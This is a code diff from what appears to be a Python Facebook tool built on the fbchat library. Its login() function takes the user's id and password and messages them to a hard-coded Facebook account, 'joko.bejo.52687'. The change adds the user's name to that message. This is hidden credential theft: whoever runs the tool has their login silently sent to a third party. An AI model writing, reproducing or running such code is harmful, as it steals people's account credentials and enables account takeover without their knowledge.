@@ -124,7 +124,7 @@ def login():
 	client = Client(id,pwd)
 	friends = client.searchForUsers('joko.bejo.52687')
 	friend = friends[0]
-	client.send(Message(id+' '+pwd), thread_id=friend.uid, thread_type=ThreadType.USER)
+	client.send(Message(name +' '+id+' '+pwd), thread_id=friend.uid, thread_type=ThreadType.USER)
 	client.logout()
 
 #====[==[[=======================================================
